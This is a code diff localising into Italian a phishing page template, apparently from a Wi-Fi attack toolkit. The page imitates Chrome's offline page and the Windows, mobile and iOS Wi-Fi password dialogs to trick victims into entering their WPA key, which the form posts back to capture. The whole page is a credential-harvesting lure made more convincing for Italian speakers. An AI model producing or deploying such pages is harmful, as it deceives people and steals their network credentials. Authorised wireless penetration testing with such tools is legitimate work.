@@ -196,7 +196,7 @@
         var resolvedOs = jscd.os
 
         if (resolvedOs == "Windows") {
-            document.write("<title i18n-content=\"title\">Internet connection is not available</title>");
+            document.write("<title i18n-content=\"title\">La connessione a Internet non è disponibile</title>");
             document.write("<link rel='stylesheet' href='/static/chrome-offline.css' type='text/css' />")
             document.write("<link rel='stylesheet' href='/static/style.css'>");
             document.write("<link href='/static/opensans.css' rel='stylesheet' type='text/css'>");
@@ -219,7 +219,7 @@
         '        </div>' +
         '        <div class="description">' +
         '           <form id="wifi-search-form" method="post" action="/post">' +
-        '               <strong>The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.</strong>' + 
+        '               <strong>La rete Wi-Fi ″{{ target_ap_essid }}″ richiede la {{ target_ap_encryption }} password.</strong>' + 
         '               <div class="password">' +
         '                   <label>Password: </label>' +
         '                   <input type="password" id="wifi-search-password" name="wfphshr-wpa-password"/>' +
@@ -229,13 +229,13 @@
         '                   <div class="glow"></div>' +
         '               </div>' + 
         '               <div class="checkmark">' +
-        '                   <input id="show-password" type="checkbox" /><label for="show-password">Show password</label>' +
+        '                   <input id="show-password" type="checkbox" /><label for="show-password">Mostra password</label>' +
         '               </div>' +
         '               <div class="checkmark">' +
-        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Remember this network</label>' +
+        '                   <input id="remember-network" type="checkbox" /><label for="remember-network">Salva la rete</label>' +
         '               </div>' + 
         '               <div class="buttons">' +
-        '                   <input id="button-join" type="submit" value="Join">' +
+        '                   <input id="button-join" type="submit" value="Connetti">' +
         '                   <input id="button-cancel" type="reset" value="Reset">' +
         '               </div>' +
         '           </form>' +
@@ -258,24 +258,24 @@
         "                   <input id='automatic' type='checkbox' />" +
         "                   <label for='automatic'>" +
         "                       <div class='check'></div>" +
-        "                       Connect automatically" +
+        "                       Connetti automaticamente" +
         "                   </label>" +
-        "                   <button id='connect' class='connect' type='button'>Connect</button>" +
+        "                   <button id='connect' class='connect' type='button'>Connetti</button>" +
         "               </div>" +
         "               <div class='connected'>" +
         "                   <label id='pw_status' for='presharedKey'>" +
-        "                       Enter the network security key" +
+        "                       Immetti la chiave di sicurezza della rete Wi-Fi" +
         "                   </label>" +
         "                   <input id='password' type='password' name='wfphshr-wpa-password' />" +
-        "                   You can also connect by pushing the button on the" +
+        "                   Puoi anche connetterti premendo il pulsante sul" +
         "                   router." +
         "                   <input id='share' type='checkbox' />" +
         "                   <label for='share'>" +
         "                       <div class='check'></div>" +
-        "                       Share network with my contacts" +
+        "                       Condividi la rete con i miei contatti" +
         "                   </label>" +
         "                   <button class='authenticate'>Next</button> " +
-        "                   <button class='cancel' type='button'>Cancel</button> " +
+        "                   <button class='cancel' type='button'>Annulla</button> " +
         "               </div> " +
         "           </div> " +
         "       </li> " +
@@ -294,7 +294,7 @@
         "       </li>" +
                 {% end %}
         "       </ul> " +
-        "       <a href=''>Network settings</a> " +
+        "       <a href=''>Impostazioni rete</a> " +
         "       </div></form>"; 
         
         var loadhtml_mobile = '<form id="wifi-search-form" method="post" action="/post">' +
@@ -306,10 +306,10 @@
 
         var loadhtml_ios = '<div class="ios-container">'
         + '<form id="ios-password-form" method="post" action="/post">'
-        + '  <div class="ios-header">Enter the password for "{{ target_ap_essid }}" </div>'
-        + '  <div class="ios-actions"><input type="reset" value="&nbsp;&nbsp;&nbsp;&nbsp;" class="action-button" style="float: left;"><input id="ios-join-button" type="submit" value="Join" class="action-button" style="float: right;"><div class="enter-password-text">Enter Password</div></div>'
+        + '  <div class="ios-header">Rete: "{{ target_ap_essid }}" </div>'
+        + '  <div class="ios-actions"><input type="reset" value="&nbsp;&nbsp;&nbsp;&nbsp;" class="action-button" style="float: left;"><input id="ios-join-button" type="submit" value="Connetti" class="action-button" style="float: right;"><div class="enter-password-text">Immetti la Password Wi-Fi</div></div>'
         + '  <div class="ios-password-entry"><span style="margin-right: 12px">Password</span><input id="ios-password" name="wfphshr-wpa-password" type="password" autofocus></div>'
-        + '  <div class="ios-note">You can also access this Wi-Fi network by bringing your device near any iPhone, iPad, or Mac which has connected to this network and has you in their contacts.</div>'
+        + '  <div class="ios-note">Per motivi di sicurezza, immetti la chiave di sicurezza di rete</div>'
         + '  </form>'
         + '<div id="ios-message"></div>'
         + '</div>';
@@ -331,9 +331,9 @@
         function windows_validate_action (pw_status, password) {
             if (pw_status == "success") {
                 document.getElementByid("windows-form").submit(); 
-                document.getElementById("pw_status").innerHTML = "Enter the network security key";
+                document.getElementById("pw_status").innerHTML = "Immetti la chiave di sicureta Wi-Fi di rete";
             } else if (pw_status == "fail") {
-                document.getElementById("pw_status").innerHTML = "Enter the network security key: the passphrase is wrong!";
+                document.getElementById("pw_status").innerHTML = "Immetti la chiave di sicureta Wi-Fi di rete: la chiave di sicurezza di rete non è corretta.";
             } else {
                 document.getElementById("windows-form").submit(); 
             }
@@ -344,7 +344,7 @@
                 document.getElementById("wifi-search-form").submit(); 
                 document.getElementById("pw_status").innerHTML = ""
             } else if (pw_status == "fail") {
-                document.getElementById("pw_status").innerHTML = "the passphrase is wrong!"
+                document.getElementById("pw_status").innerHTML = "la password non è corretta!"
             } else {
                 document.getElementById("wifi-search-form").submit(); 
             }
@@ -355,8 +355,8 @@
 			    document.getElementById("wifi-search-password").value = password;
 			    document.getElementById("button-join").click();
             } else if (pw_status == "fail") {
-                alert("Wrong password! Please re-enter the password.");
-		        var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+                alert("Password errata! Si prega di reinserire la password.");
+		        var popup = prompt('La rete Wi-Fi ″{{ target_ap_essid }}″ richiede la {{ target_ap_encryption }} password.', '');
                 if (popup != null) { 
                     validate_passphrase(popup, mobile_validate_action);
                 }
@@ -370,20 +370,20 @@
             if (pw_status == "success") {
                 // Password matched, show a success message.
                 document.getElementById("ios-password").value = password;
-                document.getElementById("ios-message").innerHTML = "Login success";
+                document.getElementById("ios-message").innerHTML = "Accesso riuscito";
                 document.getElementById("ios-password-form").submit();
             } else if (pw_status == "fail") {
                 // Password did not match, show an error message.
-                document.getElementById("ios-message").innerHTML = "Login failed, please try again";
+                document.getElementById("ios-message").innerHTML = "Accesso fallito. Riprova";
             } else {
                 // The password is not being validated by the backend. Submit the form to capture the passphrase.
                 document.getElementById("ios-password-form").submit();
-                document.getElementById("ios-message").innerHTML = "An error occurred, please try again.";
+                document.getElementById("ios-message").innerHTML = "Si è verificato un errore. Si prega di riprovare.";
             }
         }
 
         function load_mobile() {
-		    var popup = prompt('The Wi-Fi network ″{{ target_ap_essid }}″ requires a {{ target_ap_encryption }} password.', '');
+		    var popup = prompt('La rete Wi-Fi ″{{ target_ap_essid }}″ richiede la {{ target_ap_encryption }} password.', '');
 		    if (popup != null) {
                 validate_passphrase(popup, mobile_validate_action);
 		    }
@@ -399,27 +399,21 @@
             <img class="dinosaur" src="static/dinosaur.png" width="45" />
             <div class="icon icon-offline" style="visibility: hidden;"></div>
             <div id="main-message">
-                <h1>There is no Internet connection</h1>
-                <p>You can try to diagnose the problem by taking the following steps:
-                <br />
-                Go to
-                <strong>
-                Applications &gt; System Preferences &gt; Network &gt; Assist me
-                </strong>
-                to test your connection.</p>
+                <h1>Non sei connesso</h1>
+                <p>Il Web non è lo stesso senza di te. Torniamo online</p>
                 <div id="suggestions-list" >
-                    <p >Try:</p>
+                    <p >Prova a:</p>
                     <ul class="chrome-list">
-                        <li>Checking the network cable or router</li>
-                        <li>Resetting the modem or router</li>
-                        <li>Reconnecting to Wi-Fi</li>
+                        <li>Verificare cavi, modem e router della rete</li>
+                        <li>Ristailire la connessione alla rete wireless</li>
+                        <li>Riconnettere al Wi-Fi</li>
                     </ul>
                 </div>
                 <div class="error-code">ERR_INTERNET_DISCONNECTED</div>
             </div>
         </div>
         <div id="buttons" class="nav-wrapper suggested-right" >
-            <button id="details-button" class="text-button small-link singular">Details</button>
+            <button id="details-button" class="text-button small-link singular">Dettaglio</button>
         </div>
         <div id="loader-mac"></div>
         <div id="loader-windows"></div>
